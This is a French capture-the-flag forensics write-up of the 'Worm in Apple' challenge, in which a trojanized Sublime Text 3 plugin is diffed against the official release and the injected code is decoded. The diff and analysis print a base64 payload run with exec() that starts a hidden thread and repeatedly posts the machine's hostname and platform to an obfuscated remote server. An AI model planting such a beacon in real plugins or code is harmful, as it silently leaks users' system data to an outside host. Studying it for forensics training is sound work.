** Forensics - Worm in Apple **

Enoncé

```
A guy I met on the Internet wanted me to test its new ST3 plugin.

I have a bad feeling about this...

Maybe you can tell me if I'm right to be worried?

Investigate as far as you can.
```


On commence avec le plugin de Sublim Text 3 [Sources](source/DoxyDoxygen.sublime-package)

Le contenu du fichier est le suivant :

```BASH
ls 

Context.sublime-menu              doxy_libs
CrashReport.hidden-tmLanguage     Doxy.py
Default (Linux).sublime-keymap    Doxy.sublime-build
Default (OSX).sublime-keymap      Doxy.sublime-commands
Default.sublime-keymap            Doxy.sublime-settings
Default.sublime-settings          INI-Symbols.tmPreferences
Default (Windows).sublime-keymap  INI.tmLanguage
DoxyDoxygen.sublime-package       INI.tmPreferences
Doxygen.sublime-settings          Main.sublime-menu
Doxygen-Symbols.tmPreferences     messages
Doxygen.tmLanguage                messages.json
Doxygen.tmPreferences             package-metadata.json
```


On récupère le plugin officiel pour comparer avec la version fournie : https://github.com/20Tauri/DoxyDoxygen/releases

```BASH
diff origin/ officiel/
Seulement dans origin/: DoxyDoxygen.sublime-package
Les sous-répertoires origin/doxy_libs et officiel/doxy_libs sont identiques
diff origin/Doxy.py officiel/Doxy.py
133,137d132
< try:
<     import base64;A=b'IyAgICAgICAvIVwgRk9SIEVEVUNBVElPTkFMIFBVUlBPU0UgT05MWSAvIVwKQT0nNy4yemJ2LWJuMDB5cmNwNHNjdi0zcnA1MnY0OWJ2LTNuY3MyJwpCPTQ0MwpDPScwMTIzNDU2Nzg5YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXotLicKaW1wb3J0IHRpbWU7aW1wb3J0IHJlcXVlc3RzO2ltcG9ydCBwbGF0Zm9ybTtmcm9tIHV1aWQgaW1wb3J0IHV1aWQ0O2Zyb20gdGhyZWFkaW5nIGltcG9ydCBUaHJlYWQKZGVmIHcoKToKICAgIGksdT1zdHIodXVpZDQoKSksJ2h0dHBzOi8ve306e30ve30nLmZvcm1hdCgnJy5qb2luKFtDWyhDLmluZGV4KGUpLTB4MGQpJWxlbihDKV0gZm9yIGUgaW4gQV0pLEIsJycuam9pbihbY2hyKGVeMHg0MikgZm9yIGUgaW4gWzQ0LDQ1LDU0LDQzLDM2LDU5XV0pKQogICAgd2hpbGUgVHJ1ZTpyZXF1ZXN0cy5wb3N0KHUsanNvbj17J3V1aWQnOmksJ25vZGUnOnBsYXRmb3JtLm5vZGUoKSwncGxhdGZvcm0nOnBsYXRmb3JtLnBsYXRmb3JtKCl9KTt0aW1lLnNsZWVwKDUpCnQ9VGhyZWFkKHRhcmdldD13KQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOnQuc3RhcnQoKTt0LmpvaW4oKQplbHNlOnQuZGFlbW9uPVRydWU7dC5zdGFydCgpCg==';exec(base64.b64decode(A));
< except:
<     pass
< 
738c733
< __version__ = "0.63.3" 
---
> __version__ = "0.64.0" 
Les sous-répertoires origin/messages et officiel/messages sont identiques
diff origin/messages.json officiel/messages.json
2d1
<     "0.62.1":    "messages/0.62.1.txt",
6a6
>     "0.64.0":    "messages/0.64.0.txt",
Seulement dans origin/: package-metadata.json
Seulement dans officiel/: ST3_DoxyDoxygen.sublime-package
```

Un base64 est ajouté et executé dans la version du challenge.

On le décode :

```BASH

echo 'IyAgICAgICAvIVwgRk9SIEVEVUNBVElPTkFMIFBVUlBPU0UgT05MWSAvIVwKQT0nNy4yemJ2LWJuMDB5cmNwNHNjdi0zcnA1MnY0OWJ2LTNuY3MyJwpCPTQ0MwpDPScwMTIzNDU2Nzg5YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXotLicKaW1wb3J0IHRpbWU7aW1wb3J0IHJlcXVlc3RzO2ltcG9ydCBwbGF0Zm9ybTtmcm9tIHV1aWQgaW1wb3J0IHV1aWQ0O2Zyb20gdGhyZWFkaW5nIGltcG9ydCBUaHJlYWQKZGVmIHcoKToKICAgIGksdT1zdHIodXVpZDQoKSksJ2h0dHBzOi8ve306e30ve30nLmZvcm1hdCgnJy5qb2luKFtDWyhDLmluZGV4KGUpLTB4MGQpJWxlbihDKV0gZm9yIGUgaW4gQV0pLEIsJycuam9pbihbY2hyKGVeMHg0MikgZm9yIGUgaW4gWzQ0LDQ1LDU0LDQzLDM2LDU5XV0pKQogICAgd2hpbGUgVHJ1ZTpyZXF1ZXN0cy5wb3N0KHUsanNvbj17J3V1aWQnOmksJ25vZGUnOnBsYXRmb3JtLm5vZGUoKSwncGxhdGZvcm0nOnBsYXRmb3JtLnBsYXRmb3JtKCl9KTt0aW1lLnNsZWVwKDUpCnQ9VGhyZWFkKHRhcmdldD13KQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOnQuc3RhcnQoKTt0LmpvaW4oKQplbHNlOnQuZGFlbW9uPVRydWU7dC5zdGFydCgpCg==' | base64 -di
```
On obtient :

```PYTHON
#       /!\ FOR EDUCATIONAL PURPOSE ONLY /!\
A='7.2zbv-bn00yrcp4scv-3rp52v49bv-3ncs2'
B=443
C='0123456789abcdefghijklmnopqrstuvwxyz-.'
import time;import requests;import platform;from uuid import uuid4;from threading import Thread
def w():
    i,u=str(uuid4()),'https://{}:{}/{}'.format(''.join([C[(C.index(e)-0x0d)%len(C)] for e in A]),B,''.join([chr(e^0x42) for e in [44,45,54,43,36,59]]))
    while True:requests.post(u,json={'uuid':i,'node':platform.node(),'platform':platform.platform()});time.sleep(5)
t=Thread(target=w)
if __name__ == '__main__':t.start();t.join()
else:t.daemon=True;t.start()
```

Le script envoi des données au format JSON sur l'url https://worm-in-apple.ctf.insecurity-insa.fr:443/notify


Si on va à la racine du site https://worm-in-apple.ctf.insecurity-insa.fr:443/ on obtient : 


```HTML

<!DOCTYPE html>
<html lang="en">
<head>
    <title>Worm in Apple - Server</title>
    <link rel="shortcut icon" type="image/ico" href="/favicon.ico"/>
</head>
    <body>
        <pre>
     . .  .  .  . . .
.                     .                  _.-/`/`'-._
. Why are you here ?  .                /_..--''''_-'
    .  .  .  .      .`                //-.__\_\.-'
                `..'  _\\//  --.___ // ___.---.._
                  _- /@/@\  \       ||``          `-_
                .'  ,\_\_/   |    \_||_/      ,-._   `.
               ;   { o    /   }     ""        `-._`.   ;
              ;     `-==-'   /                    \_|   ;
             |        |>o<|  }@@@}                       |
             |       <(___<) }@@@@}                      |
             |       <(___<) }@@@@@}                     |
             |        <\___<) \_.?@@}                    |
              ;         V`--V`__./@}                    ;
               \      tx      ooo@}                    /
                \                                     /
                 `.                                 .'
                   `-._                         _.-'
                       ``------'''''''''------``
        </pre>
        <!-- [yo! dev! remove me! or not...]
            LyAgICAgICAgLT4geW91J3JlIGxvb2tpbicgYXQgaXQKICAgICAgICAgICAgL25vd
            GlmeSAgLT4gdGhlIGJlYWNvbiBlbmRwb2ludAogICAgICAgICAgICAvZmxhZyAgIC
            AtPiB0aGUgZmxhZyBlbnBvaW50Li4uIGJ1dCBkb24ndCBnZXQgdG8gY29ja3kgdGh
            lcmUKICAgICAgICAgICAgICAgICAgICAgICAgYXJlIHNvbWUgcmVxdWlyZW1lbnRz
            Lg==
        -->
    </body>
</html>


```

On décode le base64 :

```BASH
echo 'LyAgICAgICAgLT4geW91J3JlIGxvb2tpbicgYXQgaXQKICAgICAgICAgICAgL25vd
>             GlmeSAgLT4gdGhlIGJlYWNvbiBlbmRwb2ludAogICAgICAgICAgICAvZmxhZyAgIC
>             AtPiB0aGUgZmxhZyBlbnBvaW50Li4uIGJ1dCBkb24ndCBnZXQgdG8gY29ja3kgdGh
>             lcmUKICAgICAgICAgICAgICAgICAgICAgICAgYXJlIHNvbWUgcmVxdWlyZW1lbnRz
>             Lg==' | base64 -di
```

```
/        -> you're lookin' at it
            /notify  -> the beacon endpoint
            /flag    -> the flag enpoint... but don't get to cocky there
                        are some requirements.
```

https://worm-in-apple.ctf.insecurity-insa.fr:443/flag nous dit qu'il faut spécifier l'uuid + cookie

```PYTHON

A='7.2zbv-bn00yrcp4scv-3rp52v49bv-3ncs2'
B=443
C='0123456789abcdefghijklmnopqrstuvwxyz-.'
import time;import requests;import platform;from uuid import uuid4;from threading import Thread
def w():
    i,u=str(uuid4()),'https://{}:{}/{}'.format(''.join([C[(C.index(e)-0x0d)%len(C)] for e in A]),B,''.join([chr(e^0x42) for e in [44,45,54,43,36,59]]))
    r=requests.post(u,json={'uuid':i,'node':platform.node(),'platform':platform.platform()})
    cookies=r.cookies
    uuidu="uuid="+str(i)
    url='https://worm-in-apple.ctf.insecurity-insa.fr:443/flag?'+uuidu
    req=requests.get(url,cookies=cookies)
    print req.text
t=Thread(target=w)
if __name__ == '__main__':t.start();t.join()
else:t.daemon=True;t.start()

```


```
FLAG

here is your reward my dear: INSA{30880b4d7e6726f5614eb57d0c6d9e7aa23e9cbbae89a6c91aebb9d0352bc53b}
```


By team Beers4Flags


```
 ________
|        |
|  #BFF  |
|________|
   _.._,_|,_
  (      |   )
   ]~,"-.-~~[
 .=] Beers ([
 | ])  4   ([
 '=]) Flags [
   |:: '    |
    ~~----~~
```
